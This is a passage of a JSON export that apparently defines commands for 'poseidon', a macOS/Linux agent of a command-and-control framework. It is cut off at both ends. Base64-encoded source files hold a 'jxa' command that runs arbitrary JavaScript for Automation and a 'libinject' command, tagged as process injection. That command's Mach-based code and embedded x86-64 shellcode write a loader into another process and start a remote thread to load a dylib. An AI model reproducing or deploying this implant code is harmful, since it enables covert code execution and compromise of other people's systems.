ZGl2IGNsYXNzPSdjYXJkLWhlYWRlciBib3JkZXIgYm9yZGVyLWRhcmsgc2hhZG93Jz48YSBjbGFzcz0nYnRuIHN0cmV0Y2hlZC1saW5rJyB0eXBlPSdidXR0b24nIGRhdGEtdG9nZ2xlPSdjb2xsYXBzZScgZGF0YS10YXJnZXQ9JyN0YXNrIiArIHRhc2tbJ2lkJ10gKyBpICsgInNjcmVlbmNhcHR1cmUnIGFyaWEtZXhwYW5kZWQ9J2ZhbHNlJyBhcmlhLWNvbnRyb2xzPSd0YXNrIiArIHRhc2tbJ2lkJ10gKyAic2NyZWVuY2FwdHVyZSc+RmluaXNoZWQgPGZvbnQgY29sb3I9J3JlZCc+U2NyZWVuY2FwdHVyZSAiICsgdGFza1sncGFyYW1zJ10gKyAiPC9mb250Pi4gQ2xpY2sgdG8gdmlldzwvZGl2PiI7CiAgICAgIG91dHB1dCArPSAiPGRpdiBjbGFzcz0nY29sbGFwc2UnIGlkPVwidGFzayIgKyB0YXNrWydpZCddICsgaSArICJzY3JlZW5jYXB0dXJlXCIgc3R5bGU9J3dpZHRoOjEwMCUnPiI7CiAgICAgIG91dHB1dCArPSAiPGRpdiBjbGFzcz0ncmVzcG9uc2UtYmFja2dyb3VuZCBjYXJkLWJvZHknIHN0eWxlPSdwYWRkaW5nOjA7bWFyZ2luOjAnPjxpbWcgc3JjPScvYXBpL3YxLjQvZmlsZXMvc2NyZWVuY2FwdHVyZXMvIiArIGlkICsgIicgd2lkdGg9JzEwMCUnPjwvZGl2PjwvZGl2PjwvZGl2PiI7CiAgCX1lbHNlewogIAkJb3V0cHV0ICs9ICI8cHJlPiBkb3dubG9hZGluZyBwaWVjZXMgLi4uPC9wcmU+IjsKICAJfQogIH0KICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "needs_admin": false,
          "help_cmd": "jxa {  \"code\": \"ObjC.import('Cocoa'); $.NSBeep();\" }",
          "version": 28,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Execute jxa code",
          "cmd": "jxa",
          "parameters": [
            {
              "type": "String",
              "hint": "jxa code",
              "choices": "",
              "required": true,
              "name": "code"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "main.h": "Ly8KLy8gIG1haW4uaAovLyAganhhdGVzdAovLwovLyAgQ3JlYXRlZCBieSB4b3JyaW9yIG9uIDIvOC8yMC4KLy8gIENvcHlyaWdodCDCqSAyMDIwIHhvcnJpb3IuIEFsbCByaWdodHMgcmVzZXJ2ZWQuCi8vCgojaWZuZGVmIG1haW5faAojZGVmaW5lIG1haW5faAoKZXh0ZXJuIGNoYXIqIHJ1bmpzKGNoYXIgKnMpOwoKI2VuZGlmIC8qIG1haW5faCAqLwo="
            },
            {
              "jxa_darwin.go": "Ly8gK2J1aWxkIGRhcndpbgoKcGFja2FnZSBqeGEKLyoKI2NnbyBDRkxBR1M6IC14IG9iamVjdGl2ZS1jCiNjZ28gTERGTEFHUzogLWZyYW1ld29yayBGb3VuZGF0aW9uIC1mcmFtZXdvcmsgT1NBS2l0CiNpbmNsdWRlICJtYWluLmgiCiNpbXBvcnQgPEZvdW5kYXRpb24vRm91bmRhdGlvbi5oPgojaW1wb3J0IDxPU0FLaXQvT1NBS2l0Lmg+CgpjaGFyKiBydW5qcyhjaGFyICpzKSB7CiAgICBAdHJ5IHsKICAgICAgICBOU1N0cmluZyAqY29kZVN0cmluZyA9IFtOU1N0cmluZyBzdHJpbmdXaXRoVVRGOFN0cmluZzpzXTsKICAgICAgICBPU0FMYW5ndWFnZSAqbGFuZyA9IFtPU0FMYW5ndWFnZSBsYW5ndWFnZUZvck5hbWU6QCJKYXZhU2NyaXB0Il07CiAgICAgICAgT1NBU2NyaXB0ICpzY3JpcHQgPSBbW09TQVNjcmlwdCBhbGxvY10gaW5pdFdpdGhTb3VyY2U6Y29kZVN0cmluZyBsYW5ndWFnZTpsYW5nXTsKICAgICAgICBOU0RpY3Rpb25hcnkgKl9fYXV0b3JlbGVhc2luZyBjb21waWxlRXJyb3I7CiAgICAgICAgTlNEaWN0aW9uYXJ5ICpfX2F1dG9yZWxlYXNpbmcgcnVuRXJyb3I7CgkJW3NjcmlwdCBjb21waWxlQW5kUmV0dXJuRXJyb3I6JmNvbXBpbGVFcnJvcl07CgoJCWlmIChjb21waWxlRXJyb3IgIT0gbmlsKSB7CgkJCU5TU3RyaW5nICpyZXMgPSBydW5FcnJvcltAIk9TQVNjcmlwdEVycm9yTWVzc2FnZUtleSJdOwogICAgICAgICAgICByZXR1cm4gW3JlcyBVVEY4U3RyaW5nXTsKCQl9CgoJCU5TQXBwbGVFdmVudERlc2NyaXB0b3IqIHJlcyA9IFtzY3JpcHQgZXhlY3V0ZUFuZFJldHVybkVycm9yOiZydW5FcnJvcl07CgkJaWYgKHJ1bkVycm9yICE9IG5pbCkgewogICAgICAgICAgICBOU1N0cmluZyAqcmVzID0gcnVuRXJyb3JbQCJPU0FTY3JpcHRFcnJvck1lc3NhZ2VLZXkiXTsKICAgICAgICAgICAgcmV0dXJuIFtyZXMgVVRGOFN0cmluZ107CgkJfQoJCQogICAgICAgIE5TU3RyaW5nICpyZXN1bHQgPSBbcmVzIHN0cmluZ1ZhbHVlXTsKICAgICAgICByZXR1cm4gW3Jlc3VsdCBVVEY4U3RyaW5nXTsKICAgIH0gQGNhdGNoIChOU0V4Y2VwdGlvbiAqZXhjZXB0aW9uKSB7CiAgICAgICAgTlNTdHJpbmcgKnIgPSBbZXhjZXB0aW9uIHJlYXNvbl07CiAgICAgICAgcmV0dXJuIFtyIFVURjhTdHJpbmddOwogICAgfQp9CiovCmltcG9ydCAiQyIKCmltcG9ydCAoCgkiZW5jb2RpbmcvYmFzZTY0IgopCgoKdHlwZSBKeGFSdW5EYXJ3aW4gc3RydWN0IHsKCVN1Y2Nlc3NmdWwgYm9vbAoJUmVzdWx0cyBzdHJpbmcKfQoKZnVuYyAoaiAqSnhhUnVuRGFyd2luKSBTdWNjZXNzKCkgYm9vbCB7CglyZXR1cm4gai5TdWNjZXNzZnVsCn0KCmZ1bmMgKGogKkp4YVJ1bkRhcndpbikgUmVzdWx0KCkgc3RyaW5nIHsKCXJldHVybiBqLlJlc3VsdHMKfQoKZnVuYyBydW5Db21tYW5kKGVuY3BheWxvYWQgc3RyaW5nKSAoSnhhUnVuRGFyd2luLCBlcnJvcikgewoJcmF3cGF5bG9hZCwgZXJyIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoZW5jcGF5bG9hZCkKCWlmIGVyciAhPSBuaWwgewoJCWVtcHR5IDo9IEp4YVJ1bkRhcndpbnt9CgkJcmV0dXJuIGVtcHR5LCBlcnIKCX0KCgljcGF5bG9hZCA6PSBDLkNTdHJpbmcoc3RyaW5nKHJhd3BheWxvYWQpKQoJY3Jlc3VsdCA6PSBDLnJ1bmpzKGNwYXlsb2FkKQoJcmVzdWx0IDo9IEMuR29TdHJpbmcoY3Jlc3VsdCkKCglyIDo9IEp4YVJ1bkRhcndpbnt9CglyLlN1Y2Nlc3NmdWwgPSB0cnVlIAoJci5SZXN1bHRzID0gcmVzdWx0CglyZXR1cm4gciwgbmlsCn0="
            },
            {
              "jxa.go": "cGFja2FnZSBqeGEKCmltcG9ydCAoCgkiZW5jb2RpbmcvanNvbiIKCSJwa2cvdXRpbHMvc3RydWN0cyIKCSJzeW5jIgoJInBrZy9wcm9maWxlcyIKKQoKdmFyIG11IHN5bmMuTXV0ZXgKCnR5cGUgSnhhUnVuIGludGVyZmFjZSB7CglTdWNjZXNzKCkgYm9vbAoJUmVzdWx0KCkgc3RyaW5nCn0KCnR5cGUgQXJndW1lbnRzIHN0cnVjdCB7CglDb2RlIHN0cmluZyBganNvbjoiY29kZSJgCn0KCmZ1bmMgUnVuKHRhc2sgc3RydWN0cy5UYXNrKSB7Cgltc2cgOj0gc3RydWN0cy5SZXNwb25zZXt9Cgltc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCglhcmdzIDo9IEFyZ3VtZW50c3t9CgllcnIgOj0ganNvbi5Vbm1hcnNoYWwoW11ieXRlKHRhc2suUGFyYW1zKSwgJmFyZ3MpCgoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCQoJciwgZXJyIDo9IHJ1bkNvbW1hbmQoYXJncy5Db2RlKQoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCW1zZy5Vc2VyT3V0cHV0ID0gci5SZXN1bHQoKQoJbXNnLkNvbXBsZXRlZCA9IHRydWUKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9"
            },
            {
              "jxa_linux.go": "Ly8gK2J1aWxkIGxpbnV4CgpwYWNrYWdlIGp4YQoKaW1wb3J0ICgKCSJlcnJvcnMiCikKCnR5cGUgSnhhUnVuTGludXggc3RydWN0IHsKCVN1Y2Nlc3NmdWwgYm9vbAoJUmVzdWx0c3RyaW5nIHN0cmluZwp9CgpmdW5jIChqICpKeGFSdW5MaW51eCkgU3VjY2VzcygpIGJvb2wgewoJcmV0dXJuIGouU3VjY2Vzc2Z1bAp9CgpmdW5jIChqICpKeGFSdW5MaW51eCkgUmVzdWx0KCkgc3RyaW5nIHsKCXJldHVybiBqLlJlc3VsdHN0cmluZwp9CgoKZnVuYyBydW5Db21tYW5kKGVuY3BheWxvYWQgc3RyaW5nKSAoSnhhUnVuTGludXgsIGVycm9yKSB7CgluIDo9IEp4YVJ1bkxpbnV4e30KCW4uUmVzdWx0c3RyaW5nID0gIiIKCW4uU3VjY2Vzc2Z1bCA9IGZhbHNlCglyZXR1cm4gbiwgZXJyb3JzLk5ldygiTm90IGltcGxlbWVudGVkIikKfQ=="
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "code",
              "active": true,
              "description": "",
              "timestamp": "03\/20\/2020 01:02:00",
              "command": "jxa",
              "command_id": 89,
              "payload_type": "poseidon",
              "transform": "base64encode",
              "parameter_type": "String"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "",
          "version": 5,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "",
          "cmd": "libinject",
          "parameters": [
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "pid"
            },
            {
              "type": "String",
              "hint": "Path to the dylib to inject",
              "choices": "",
              "required": true,
              "name": "library"
            }
          ],
          "attack": [
            {
              "t_num": "T1055",
              "attack_name": "Process Injection"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "libinject_darwin.go": "Ly8gK2J1aWxkIGRhcndpbgoKcGFja2FnZSBsaWJpbmplY3QKCi8vICNjZ28gTERGTEFHUzogLWxtCi8vICNpbmNsdWRlIDxkbGZjbi5oPgovLyAjaW5jbHVkZSA8c3RkaW8uaD4KLy8gI2luY2x1ZGUgPHVuaXN0ZC5oPgovLyAjaW5jbHVkZSA8c3lzL3R5cGVzLmg+Ci8vICNpbmNsdWRlIDxtYWNoL21hY2guaD4KLy8gI2luY2x1ZGUgPG1hY2gvZXJyb3IuaD4KLy8gI2luY2x1ZGUgPGVycm5vLmg+Ci8vICNpbmNsdWRlIDxzdGRsaWIuaD4KLy8gI2luY2x1ZGUgPHN5cy9zeXNjdGwuaD4KLy8gI2luY2x1ZGUgPGRsZmNuLmg+Ci8vICNpbmNsdWRlIDxzeXMvbW1hbi5oPgovLyAjaW5jbHVkZSA8bGlicHJvYy5oPgovLwovLyAjaW5jbHVkZSA8c3lzL3N0YXQuaD4KLy8gI2luY2x1ZGUgPHB0aHJlYWQuaD4KLy8gI2luY2x1ZGUgPG1hY2gvbWFjaF92bS5oPgovLwovLyAjZGVmaW5lIFNUQUNLX1NJWkUgNjU1MzYKLy8gI2RlZmluZSBDT0RFX1NJWkUgMTI4Ci8vIGNoYXIgaW5qZWN0ZWRDb2RlW10gPQovLwovLyAiXHg1NSIgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcHVzaCAgICAgICByYnAKLy8gIlx4NDhceDg5XHhFNSIgICAgICAgICAgICAgICAgICAgIC8vIG1vdiAgICAgICAgcmJwLCByc3AKLy8gIlx4NDhceDgzXHhFQ1x4MTAiICAgICAgICAgICAgICAgIC8vIHN1YiAgICAgICAgcnNwLCAweDEwCi8vICJceDQ4XHg4RFx4N0RceEY4IiAgICAgICAgICAgICAgICAvLyBsZWEgICAgICAgIHJkaSwgcXdvcmQgW3JicCt2YXJfOF0KLy8gIlx4MzFceEMwIiAgICAgICAgICAgICAgICAgICAgICAgIC8vIHhvciAgICAgICAgZWF4LCBlYXgKLy8gIlx4ODlceEMxIiAgICAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiAgICAgICAgZWN4LCBlYXgKLy8gIlx4NDhceDhEXHgxNVx4MUFceDAwXHgwMFx4MDAiICAgIC8vIGxlYSAgICAgICAgcmR4LCBxd29yZCBwdHIgW3JpcCArIDB4MUFdCi8vICJceDQ4XHg4OVx4Q0UiICAgICAgICAgICAgICAgICAgICAvLyBtb3YgICAgICAgIHJzaSwgcmN4Ci8vICJceDQ4XHhCOCIgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3ZhYnMgICAgIHJheCwgcHRocmVhZF9jcmVhdGVfZnJvbV9tYWNoX3RocmVhZAovLyAiUFRIUkRDUlQiCi8vICJceEZGXHhEMCIgICAgICAgICAgICAgICAgICAgICAgICAvLyBjYWxsICAgICAgIHJheAovLyAiXHg4OVx4NDVceEY0IiAgICAgICAgICAgICAgICAgICAgLy8gbW92ICAgICAgICBkd29yZCBbcmJwK3Zhcl9DXSwgZWF4Ci8vICJceDQ4XHg4M1x4QzRceDEwIiAgICAgICAgICAgICAgICAvLyBhZGQgICAgICAgIHJzcCwgMHgxMAovLyAiXHg1RCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcG9wICAgICAgICByYnAKLy8gIlx4RUJceEZFIiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGptcCAgICAgICAgMHgwCi8vICJceEMzIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyByZXQKLy8KLy8gIlx4NTUiICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHB1c2ggICAgICAgcmJwCi8vICJceDQ4XHg4OVx4RTUiICAgICAgICAgICAgICAgICAgICAvLyBtb3YgICAgICAgIHJicCwgcnNwCi8vICJceDQ4XHg4M1x4RUNceDEwIiAgICAgICAgICAgICAgICAvLyBzdWIgICAgICAgIHJzcCwgMHgxMAovLyAiXHhCRVx4MDFceDAwXHgwMFx4MDAiICAgICAgICAgICAgLy8gbW92ICAgICAgICBlc2ksIDB4MQovLyAiXHg0OFx4ODlceDdEXHhGOCIgICAgICAgICAgICAgICAgLy8gbW92ICAgICAgICBxd29yZCBbcmJwK3Zhcl84XSwgcmRpCi8vICJceDQ4XHg4RFx4M0RceDFEXHgwMFx4MDBceDAwIiAgICAvLyBsZWEgICAgICAgIHJkaSwgcXdvcmQgcHRyIFtyaXAgKyAweDJjXQovLyAiXHg0OFx4QjgiICAgICAgICAgICAgICAgICAgICAgICAgLy8gbW92YWJzICAgICByYXgsIGRsb3BlbgovLyAiRExPUEVOX18iCi8vICJceEZGXHhEMCIgICAgICAgICAgICAgICAgICAgICAgICAvLyBjYWxsICAgICAgIHJheAovLyAiXHgzMVx4RjYiICAgICAgICAgICAgICAgICAgICAgICAgLy8geG9yICAgICAgICBlc2ksIGVzaQovLyAiXHg4OVx4RjciICAgICAgICAgICAgICAgICAgICAgICAgLy8gbW92ICAgICAgICBlZGksIGVzaQovLyAiXHg0OFx4ODlceDQ1XHhGMCIgICAgICAgICAgICAgICAgLy8gbW92ICAgICAgICBxd29yZCBbcmJwK3Zhcl8xMF0sIHJheAovLyAiXHg0OFx4ODlceEY4IiAgICAgICAgICAgICAgICAgICAgLy8gbW92ICAgICAgICByYXgsIHJkaQovLyAiXHg0OFx4ODNceEM0XHgxMCIgICAgICAgICAgICAgICAgLy8gYWRkICAgICAgICByc3AsIDB4MTAKLy8gIlx4NUQiICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHBvcCAgICAgICAgcmJwCi8vICJceEMzIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyByZXQKLy8KLy8gIkxJQkxJQkxJQkxJQiIKLy8gIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCi8vICJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgovLyAiXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKLy8gIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiOwovLwovLyB0YXNrX3QgdGFza0ZvclBpZFdyYXBwZXIocGlkX3QgcGlkKQovLyB7Ci8vICAgICBob3N0X3QgIG15aG9zdCA9IG1hY2hfaG9zdF9zZWxmKCk7Ci8vICAgICBob3N0X3QgIGhvc3RfcHJpdjsKLy8gICAgIG1hY2hfcG9ydF90IHBzRGVmYXVsdDsKLy8gICAgIG1hY2hfcG9ydF90IHBzRGVmYXVsdF9jb250cm9sOwovLyAgICAgdGFza19hcnJheV90ICB0YXNrczsKLy8gICAgIG1hY2hfbXNnX3R5cGVfbnVtYmVyX3QgbnVtVGFza3M7Ci8vICAgICBpbnQgaTsKLy8gICAgIHRocmVhZF9hcnJheV90ICAgdGhyZWFkczsKLy8gICAgIHRocmVhZF9pbmZvX2RhdGFfdCB0SW5mbzsKLy8gICAgIGtlcm5fcmV0dXJuX3Qga3I7Ci8vCi8vICAgICBob3N0X2dldF9ob3N0X3ByaXZfcG9ydChtYWNoX2hvc3Rfc2VsZigpLCAmaG9zdF9wcml2KTsKLy8gICAgIGtyID0gcHJvY2Vzc29yX3NldF9kZWZhdWx0KGhvc3RfcHJpdiwgJnBzRGVmYXVsdCk7Ci8vICAgICBwcm9jZXNzb3Jfc2V0X25hbWVfYXJyYXlfdCAgKnBzZXRzID0gbWFsbG9jKDEwMjQpOwovLyAgICAgbWFjaF9tc2dfdHlwZV9udW1iZXJfdCAgICBwc2V0Q291bnQ7Ci8vICAgICBrciA9IGhvc3RfcHJvY2Vzc29yX3NldHMgKGhvc3RfcHJpdiwgcHNldHMsICZwc2V0Q291bnQpOwovLwovLwovLyAgICAga3IgPSBob3N0X3Byb2Nlc3Nvcl9zZXRfcHJpdihob3N0X3ByaXYsIHBzRGVmYXVsdCwgJnBzRGVmYXVsdF9jb250cm9sKTsKLy8gICAgIGlmIChrciAhPSBLRVJOX1NVQ0NFU1MpIHsgZnByaW50ZihzdGRlcnIsICJob3N0X3Byb2Nlc3Nvcl9zZXRfcHJpdiBmYWlsZWQgd2l0aCBlcnJvciAleFxuIiwga3IpOyAgbWFjaF9lcnJvcigiaG9zdF9wcm9jZXNzb3Jfc2V0X3ByaXYiLGtyKTsgZXhpdCgxKTt9Ci8vCi8vCi8vCi8vICAgICBudW1UYXNrcz0xMDAwOwovLyAgICAga3IgPSBwcm9jZXNzb3Jfc2V0X3Rhc2tzKHBzRGVmYXVsdF9jb250cm9sLCAmdGFza3MsICZudW1UYXNrcyk7Ci8vICAgICBpZiAoa3IgIT0gS0VSTl9TVUNDRVNTKSB7IGZwcmludGYoc3RkZXJyLCJwcm9jZXNzb3Jfc2V0X3Rhc2tzIGZhaWxlZCB3aXRoIGVycm9yICV4XG4iLGtyKTsgZXhpdCgxKTsgfQovLwovLyAgICAgZm9yIChpID0gMDsgaSA8IG51bVRhc2tzOyBpKyspCi8vICAgICB7Ci8vICAgICAgICAgY2hhciBuYW1lWzEyOF07Ci8vICAgICAgICAgaW50IHA7Ci8vICAgICAgICAgcGlkX2Zvcl90YXNrKHRhc2tzW2ldLCAmcCk7Ci8vICAgICAgICAgLy9pbnQgcmM9ICBwcm9jX25hbWUocGlkLCBuYW1lLCAxMjgpOwovLyAgICAgICAgIGlmIChwID09IHBpZCkKLy8gICAgICAgICB7Ci8vCi8vICAgICAgICAgICAgIHJldHVybiB0YXNrc1tpXTsKLy8gICAgICAgICB9Ci8vICAgICB9Ci8vCi8vCi8vICAgICByZXR1cm4gMDsKLy8gfQovLyBpbnQgaW5qZWN0KHBpZF90IHBpZCwgY2hhciogbGliKQovLyB7Ci8vCi8vICAgICB0YXNrX3QgcmVtb3RlVGFzazsKLy8gICAgIHN0cnVjdCBzdGF0IGJ1ZjsKLy8KLy8gICAgIGludCByYyA9IHN0YXQgKGxpYiwgJmJ1Zik7Ci8vICAgICBpZiAocmMgIT0gMCkKLy8gICAgIHsKLy8KLy8gICAgICAgICByZXR1cm4gKC05KTsKLy8gICAgIH0KLy8KLy8gICAgIG1hY2hfZXJyb3JfdCBrciA9IDA7Ci8vCi8vICAgICByZW1vdGVUYXNrID0gdGFza0ZvclBpZFdyYXBwZXIocGlkKTsKLy8gICAgIGlmIChyZW1vdGVUYXNrID09IE5VTEwpCi8vICAgICB7Ci8vCi8vICAgICAgICAgZXhpdCgxKTsKLy8gICAgIH0KLy8KLy8gICAgIG1hY2hfdm1fYWRkcmVzc190IHJlbW90ZVN0YWNrNjQgPSAodm1fYWRkcmVzc190KSBOVUxMOwovLyAgICAgbWFjaF92bV9hZGRyZXNzX3QgcmVtb3RlQ29kZTY0ID0gKHZtX2FkZHJlc3NfdCkgTlVMTDsKLy8gICAgIGtyID0gbWFjaF92bV9hbGxvY2F0ZSggcmVtb3RlVGFzaywgJnJlbW90ZVN0YWNrNjQsIFNUQUNLX1NJWkUsIFZNX0ZMQUdTX0FOWVdIRVJFKTsKLy8KLy8gICAgIGlmIChrciAhPSBLRVJOX1NVQ0NFU1MpCi8vIAl7Ci8vCi8vIAkJcmV0dXJuICgtMik7Ci8vIAl9Ci8vCi8vCi8vCi8vCi8vCi8vICAgICByZW1vdGVDb2RlNjQgPSAodm1fYWRkcmVzc190KSBOVUxMOwovLyAgICAga3IgPSBtYWNoX3ZtX2FsbG9jYXRlKCByZW1vdGVUYXNrLCAmcmVtb3RlQ29kZTY0LCBDT0RFX1NJWkUsIFZNX0ZMQUdTX0FOWVdIRVJFICk7Ci8vCi8vICAgICBpZiAoa3IgIT0gS0VSTl9TVUNDRVNTKQovLyAgICAgewovLwovLyAgICAgICAgIHJldHVybiAoLTIpOwovLyAgICAgfQovLwovLyAgICAgaW50IGkgPSAwOwovLyAgICAgY2hhciAqcG9zc2libGVQYXRjaExvY2F0aW9uID0gKGluamVjdGVkQ29kZSApOwovLyAgICAgZm9yIChpID0gMCA7IGkgPCAweDEwMDsgaSsrKQovLyAgICAgewovLwovLyAgICAgICAgIGV4dGVybiB2b2lkICpfcHRocmVhZF9zZXRfc2VsZjsKLy8gICAgICAgICBwb3NzaWJsZVBhdGNoTG9jYXRpb24rKzsKLy8KLy8KLy8gICAgICAgICB1aW50NjRfdCBhZGRyT2ZQdGhyZWFkQ3JlYXRlRnJvbU1hY2hUaHJlYWQgPSAodWludDY0X3QpZGxzeW0oIFJUTERfREVGQVVMVCwgInB0aHJlYWRfY3JlYXRlX2Zyb21fbWFjaF90aHJlYWQiKTsgLy8odWludDY0X3QpIF9wdGhyZWFkX3NldF9zZWxmOyBHZXQgdGhlIGFkZHJlc3MsIGJlY2F1c2Ugd2UgcHVsbCB0aGUgYWRkcmVzcyBmcm9tIHRoZSBzaGFyZWRjYWNoZS4KLy8gICAgICAgICB1aW50NjRfdCBhZGRyT2ZEbG9wZW4gPSAodWludDY0X3QpIGRsb3BlbjsKLy8gICAgICAgICB1aW50NjRfdCBhZGRyT2ZTbGVlcCA9ICh1aW50NjRfdCkgc2xlZXA7Ci8vCi8vICAgICAgICAgaWYgKG1lbWNtcCAocG9zc2libGVQYXRjaExvY2F0aW9uLCAiUFRIUkRDUlQiLCA4KSA9PSAwKQovLyAgICAgICAgIHsKLy8gICAgICAgICAgICAgbWVtY3B5KHBvc3NpYmxlUGF0Y2hMb2NhdGlvbiwgJmFkZHJPZlB0aHJlYWRDcmVhdGVGcm9tTWFjaFRocmVhZCw4KTsKLy8KLy8gICAgICAgICB9Ci8vCi8vICAgICAgICAgaWYgKG1lbWNtcChwb3NzaWJsZVBhdGNoTG9jYXRpb24sICJETE9QRU5fXyIsIDYpID09IDApCi8vICAgICAgICAgewovLwovLyAgICAgICAgICAgICBtZW1jcHkocG9zc2libGVQYXRjaExvY2F0aW9uLCAmYWRkck9mRGxvcGVuLCBzaXplb2YodWludDY0X3QpKTsKLy8gICAgICAgICB9Ci8vCi8vICAgICAgICAgaWYgKG1lbWNtcChwb3NzaWJsZVBhdGNoTG9jYXRpb24sICJMSUJMSUJMSUIiLCA5KSA9PSAwKQovLyAgICAgICAgIHsKLy8gICAgICAgICAgICAgc3RyY3B5KHBvc3NpYmxlUGF0Y2hMb2NhdGlvbiwgbGliICk7Ci8vICAgICAgICAgfQovLwovLyAgICAgfQovLwovLyAJa3IgPSBtYWNoX3ZtX3dyaXRlKHJlbW90ZVRhc2sscmVtb3RlQ29kZTY0LCAodm1fYWRkcmVzc190KSBpbmplY3RlZENvZGUsIDB4YTkpOyAgICAgICAgICAgICAgICAgICAgICAgLy8gTGVuZ3RoIG9mIHRoZSBzb3VyY2UKLy8KLy8gICAgIGlmIChrciAhPSBLRVJOX1NVQ0NFU1MpCi8vIAl7Ci8vCi8vIAkJcmV0dXJuICgtMyk7Ci8vIAl9Ci8vCi8vICAgICBrciAgPSB2bV9wcm90ZWN0KHJlbW90ZVRhc2ssIHJlbW90ZUNvZGU2NCwgMHg3MCwgRkFMU0UsIFZNX1BST1RfUkVBRCB8IFZNX1BST1RfRVhFQ1VURSk7Ci8vICAgICBrciAgPSB2bV9wcm90ZWN0KHJlbW90ZVRhc2ssIHJlbW90ZVN0YWNrNjQsIFNUQUNLX1NJWkUsIFRSVUUsIFZNX1BST1RfUkVBRCB8IFZNX1BST1RfV1JJVEUpOwovLyAgICAgaWYgKGtyICE9IEtFUk5fU1VDQ0VTUykKLy8gCXsKLy8KLy8gCQlyZXR1cm4gKC00KTsKLy8gCX0KLy8KLy8gICAgIHg4Nl90aHJlYWRfc3RhdGU2NF90IHJlbW90ZVRocmVhZFN0YXRlNjQ7Ci8vICAgICB0aHJlYWRfYWN0X3QgICAgICAgICByZW1vdGVUaHJlYWQ7Ci8vCi8vICAgICBtZW1zZXQoJnJlbW90ZVRocmVhZFN0YXRlNjQsICdcMCcsIHNpemVvZihyZW1vdGVUaHJlYWRTdGF0ZTY0KSApOwovLwovLyAgICAgcmVtb3RlU3RhY2s2NCArPSAoU1RBQ0tfU0laRSAvIDIpOwovLwovLwovLyAgICAgY29uc3QgY2hhciogcCA9IChjb25zdCBjaGFyKikgcmVtb3RlQ29kZTY0OwovLyAgICAgcmVtb3RlVGhyZWFkU3RhdGU2NC5fX3JpcCA9ICh1X2ludDY0X3QpICh2bV9hZGRyZXNzX3QpIHJlbW90ZUNvZGU2NDsKLy8KLy8KLy8gICAgIHJlbW90ZVRocmVhZFN0YXRlNjQuX19yc3AgPSAodV9pbnQ2NF90KSByZW1vdGVTdGFjazY0OwovLyAgICAgcmVtb3RlVGhyZWFkU3RhdGU2NC5fX3JicCA9ICh1X2ludDY0X3QpIHJlbW90ZVN0YWNrNjQ7Ci8vCi8vCi8vCi8vICAgICBrciA9IHRocmVhZF9jcmVhdGVfcnVubmluZyggcmVtb3RlVGFzaywgeDg2X1RIUkVBRF9TVEFURTY0LCAodGhyZWFkX3N0YXRlX3QpICZyZW1vdGVUaHJlYWRTdGF0ZTY0LCB4ODZfVEhSRUFEX1NUQVRFNjRfQ09VTlQsICZyZW1vdGVUaHJlYWQgKTsKLy8KLy8gICAgIGlmIChr